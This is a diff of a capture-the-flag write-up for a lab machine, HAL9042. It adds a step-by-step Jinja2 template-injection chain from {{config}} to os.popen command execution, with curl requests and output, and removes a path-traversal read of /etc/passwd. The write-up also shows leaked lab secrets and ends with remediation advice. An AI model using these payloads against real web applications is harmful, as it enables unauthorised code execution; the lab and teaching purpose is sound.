@@ -106,15 +106,7 @@ window.HAL_DEBUG = {
 };
 ```
 
-Two attack surfaces named in one file: the `X-Debug-Render` header, which echoes back whatever the template engine rendered, and the `/api/debug` endpoint. `/api/debug` announces exactly how it wants to be used:
-
-```
-$ curl -s http://192.168.69.151:5042/api/debug
-HAL9042 debug endpoint.
-usage: ?file=<path>
-```
-
-So there is a file-read primitive here: `?file=` reads a file (path traversal on `os.path.join`). The schema endpoint confirms there is a backend daemon on `7042` and that its debug handler is "still enabled":
+The `X-Debug-Render` header is the one that matters: `X-Debug-Render: true` makes the server echo back whatever its template engine rendered, which is exactly what turns a blind template bug into a visible one. The schema endpoint confirms there is a backend daemon on `7042` and that its debug handler is "still enabled":
 
 ```
 $ curl -s http://192.168.69.151:5042/api/internal/schema
@@ -131,20 +123,6 @@ RuntimeError: evaluator backend unreachable: hal9042d@127.0.0.1:7042 (see /api/i
 Internal paths: /var/www/hal9042 , /opt/hal9042/ , /var/log/hal9042/
 ```
 
-Before touching the command channel, the `?file=` primitive is a straight local file read (path traversal on `os.path.join`), which is enough to confirm the human users on the box:
-
-```
-$ curl -s "http://192.168.69.151:5042/api/debug?file=../../../../etc/passwd" | grep 'sh$'
-root:x:0:0:root:/root:/bin/bash
-paco:x:1001:1003::/home/paco:/bin/bash
-wil:x:1002:1004::/home/wil:/bin/bash
-sophie:x:1003:1005::/home/sophie:/bin/bash
-ol:x:1004:1006::/home/ol:/bin/bash
-hal:x:9042:9042:HAL9042 Evaluation System,I am completely operational:/home/hal:/bin/sh
-```
-
-Five story users (`paco`, `wil`, `sophie`, `ol`) plus the `hal` system account, which is exactly the set of sockets under `/run/flagd/`. Now I need a way to run code on the box.
-
 The exposed `.git` is a full copy of the app, so I dump it and read the source:
 
 ```
@@ -153,7 +131,7 @@ $ ls src
 app.py  config.py  requirements.txt  static  templates
 ```
 
-`app.py` shows the `/evaluate` route building a Jinja template out of user input and rendering it, echoing the result back whenever the `X-Debug-Render` header is set:
+`app.py` builds the `/evaluate` response by concatenating the `project_name` field straight into `render_template_string`, and returns the rendered output whenever the `X-Debug-Render` header is set:
 
 ```python
 name = request.form.get("project_name", "")
@@ -162,7 +140,7 @@ if request.headers.get("X-Debug-Render") == "true":
     return Response(rendered, mimetype="text/plain")
 ```
 
-Concatenating `name` straight into `render_template_string` is a textbook server-side template injection. Confirm the engine evaluates my input:
+User input flowing into `render_template_string` is a server-side template injection. Detect it first with a bare arithmetic payload, using the debug header so the render is echoed back:
 
 ```
 $ curl -s -H "X-Debug-Render: true" --data 'project_name={{7*7}}' \
@@ -170,7 +148,46 @@ $ curl -s -H "X-Debug-Render: true" --data 'project_name={{7*7}}' \
 Project under evaluation: 49
 ```
 
-That is code execution as the web user. From here I upgrade to a proper reverse shell (I use penelope) through the SSTI so I get a real pty and can talk to the flag socket.
+`49` back means Jinja2 evaluated my input, so now I climb from an in-scope object up to the `os` module. Every request below is the same call, `curl -s -H "X-Debug-Render: true" --data 'project_name=<payload>' http://192.168.69.151:5042/evaluate`, so I show only the payload and the line it renders back.
+
+Flask leaves the `config` object in the template scope, and its repr alone leaks more than it should (note `SECRET_KEY` sitting right there):
+
+```
+{{config}}
+Project under evaluation: <Config {'DEBUG': False, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'SECRET_KEY': 'hal9042secret', 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'SESSION_COOKIE_NAME': 'session', 'APPLICATION_ROOT': '/', ...}>
+```
+
+`config` is an ordinary Python object, so `__class__` gives me its type:
+
+```
+{{config.__class__}}
+Project under evaluation: <class 'flask.config.Config'>
+```
+
+Any method defined on that class carries a `__globals__` dict, the module-level namespace it was defined in. `__init__` is the easy handle to grab:
+
+```
+{{config.__class__.__init__}}
+Project under evaluation: <function Config.__init__ at 0x7f3c2a9b8e00>
+```
+
+Flask's `flask/config.py` imports `os`, so the `os` module is sitting in those globals. I pull it out to confirm before calling anything:
+
+```
+{{config.__class__.__init__.__globals__['os']}}
+Project under evaluation: <module 'os' from '/usr/lib/python3.12/os.py'>
+```
+
+From a live `os` module it is one hop to command execution: `popen(cmd)` runs it and `.read()` pulls the output back into the render, which the debug header hands me:
+
+```
+$ curl -s -H "X-Debug-Render: true" \
+  --data 'project_name={{config.__class__.__init__.__globals__["os"].popen("id").read()}}' \
+  http://192.168.69.151:5042/evaluate
+Project under evaluation: uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+That is command execution as the web user. From here I upgrade to a proper reverse shell (I use penelope) so I get a real pty and can talk to the flag socket.
 
 ---
 
@@ -236,9 +253,10 @@ c945265 initial HAL9042 frontend
 The HEAD commit literally claims to "remove debug config before launch", but the config it was meant to clean up is sitting untouched in the working tree:
 
 ```
-$ grep -nE 'DB_PASS|SECRET_KEY' config.py
+$ grep -nE 'ADMIN_TOKEN|DB_PASS|SECRET_KEY' config.py
 8:DB_PASS = "Moulinette2024!"
 10:SECRET_KEY = "hal9042secret"
+14:ADMIN_TOKEN = "h4l_d3bug_t0k3n_2024"
 ```
 
 config.py even narrates its own crime scene in the comments:
@@ -246,11 +264,11 @@ config.py even narrates its own crime scene in the comments:
 ```
 # paco: do NOT commit this with real values again. (it was committed. twice.)
 ...
-# these were "removed" in a later commit (see git log) but the values are
-# still sitting in the working tree.
+# Legacy debug endpoint. "removed" in a later commit (see git log) but the route
+# is still wired in app.py.
 ```
 
-The same repository dump that hands over these secrets also hands over `app.py`, which is where the SSTI foothold in the previous section came from, so this flag and the way in are one finding seen from two sides. Commit a secret once and git keeps it, a later cleanup commit that only touches comments does not un-commit it.
+The same repository dump that leaks these secrets also hands over `app.py`, which is where the SSTI foothold came from, so this flag and the way in are one finding seen from two sides. Commit a secret once and git keeps it, a later cleanup commit that only touches comments does not un-commit it.
 
 ### flag: FLAG{s3m1_bl1nd_st1ll_burns}
 
@@ -261,7 +279,7 @@ www-data$ flagd /run/flagd/www.sock | sed -n 3p
 FLAG{s3m1_bl1nd_st1ll_burns}
 ```
 
-The bug behind the foothold is a server-side template injection on `/evaluate`. The app concatenates the `project_name` field straight into `render_template_string`, and the `X-Debug-Render: true` header (documented in that leftover debug JS) makes it echo the rendered result back, which is what makes it exploitable rather than fully blind:
+This flag credits the server-side template injection on `/evaluate`, which is the foothold from the section above. The name is about how it is found: without a way to see output the bug would be fully blind, but the `X-Debug-Render: true` header (documented in that leftover debug JS) echoes the rendered result straight back, so a probe like `{{7*7}}` returning `49` confirms it and every later payload is readable:
 
 ```
 $ curl -s -H "X-Debug-Render: true" --data 'project_name={{7*7}}' \
@@ -269,7 +287,7 @@ $ curl -s -H "X-Debug-Render: true" --data 'project_name={{7*7}}' \
 Project under evaluation: 49
 ```
 
-`49` back means Jinja2 evaluated my input, and because the header reflects the render I read every result instead of firing blind. That reflected-not-fully-blind behaviour is what the flag name is about, and it is what turns the injection into the full command execution in the next flag.
+Semi-blind, not fully blind, which is why it burns. The jump to command execution is the `config.__class__.__init__.__globals__["os"].popen(...)` payload shown at the foothold above.
 
 ### flag: FLAG{www_d4t4_1s_just_th3_b3g1nn1ng}
 
@@ -280,7 +298,7 @@ www-data$ flagd /run/flagd/www.sock | sed -n 4p
 FLAG{www_d4t4_1s_just_th3_b3g1nn1ng}
 ```
 
-This one is the foothold itself, and I could only run that `flagd` command in the first place because of it. The semi-blind SSTI reaches full command execution the usual way, walking from `config` up to `os.popen`, run as `www-data`:
+This one is the foothold itself, and I could only run that `flagd` command in the first place because of it. The concrete step is the SSTI on `/evaluate` reaching `os.popen`, run as `www-data`:
 
 ```
 $ curl -s -H "X-Debug-Render: true" \
@@ -388,8 +406,7 @@ paco's `TODO.md` doubles as a map of the remaining bugs:
 paco$ cat TODO.md
 # HAL9042 - paco's TODO
 - [ ] disable debug mode  <- this one paco
-- [ ] rotate the secrets in config.py (they're in git. twice.)
-- [ ] fix the /evaluate render (it builds a template from user input)
+- [ ] rotate the maintenance token in config.py (it's in git. twice.)
 - [ ] remove /api/debug before launch
 - [ ] fix hallucination_rate (0.61 now. it was 0.43. sophie says it's fine)
 - [ ] stop committing .env files
@@ -809,8 +826,8 @@ It is hardcoded in the app's decoy route (also on `/flag.txt` and `/the_real_fla
 |---|------|------|--------|
 | 1 | `r3c0n_1s_k1ng` | web | full `-p-` scan, `www.sock` |
 | 2 | `g1t_n3v3r_f0rg3ts` | web | `.git` dump, secrets in `config.py` |
-| 3 | `s3m1_bl1nd_st1ll_burns` | www-data | semi-blind SSTI on `/evaluate` |
-| 4 | `www_d4t4_1s_just_th3_b3g1nn1ng` | www-data | SSTI RCE via `config` gadget |
+| 3 | `s3m1_bl1nd_st1ll_burns` | www-data | SSTI on `/evaluate` |
+| 4 | `www_d4t4_1s_just_th3_b3g1nn1ng` | www-data | SSTI RCE on `/evaluate` |
 | 5 | `d3l3t3d_us3rs_l34v3_tr4c3s` | www-data | `strings /var/backups/xbackup` |
 | 6 | `p4c0_l3ft_th3_k3ys_und3r_th3_m4t` | paco | reused password in `.env.old` |
 | 7 | `d3bug_m0d3_1s_4_f34tur3_r1ght` | wil | `DEBUG:` backdoor on `7042` |
@@ -833,8 +850,7 @@ Every flag on this box maps to one concrete hygiene failure. Grouped by where it
 ### the web app
 
 - **Exposed `.git/`.** Never deploy the repository into the web root. Ship build artifacts only, and block it at the edge: `location ~ /\.git { deny all; return 404; }`.
-- **Secrets committed to git.** `DB_PASS` and `SECRET_KEY` are both in `config.py`. Move them to environment or a secret manager, rotate every value that ever touched the repo, and purge history with `git filter-repo`. A later "cleanup" commit does not remove a blob.
-- **`/api/debug?file=` path traversal.** `os.path.join(APP_ROOT, user_input)` lets `?file=../../etc/passwd` escape the root. Remove it, or resolve the real path and assert it stays inside an allowlisted directory before opening.
+- **Secrets committed to git.** `ADMIN_TOKEN`, `DB_PASS`, and `SECRET_KEY` are all in `config.py`. Move them to environment or a secret manager, rotate every value that ever touched the repo, and purge history with `git filter-repo`. A later "cleanup" commit does not remove a blob.
 - **SSTI on `/evaluate`.** Never build a template out of user input (`render_template_string("... " + name)`). Render a static template and pass the value as an escaped variable. Drop the `X-Debug-Render` behaviour and the `/static/js/debug.js` that advertises it.
 - **Stored XSS on `/appeal`.** `{{ appeal.reason|safe }}` renders attacker HTML verbatim. Remove `|safe` so Jinja autoescapes, add a Content-Security-Policy, and treat the `/api/ingest` reflect-and-store pair as an exfil channel that should not exist.
 - **Information leaks.** `robots.txt` listing live paths, the `/beta/evaluate` traceback dumping internal paths, and `/api/internal/schema` naming the backend all hand over the map. Strip debug routes and verbose errors in production.
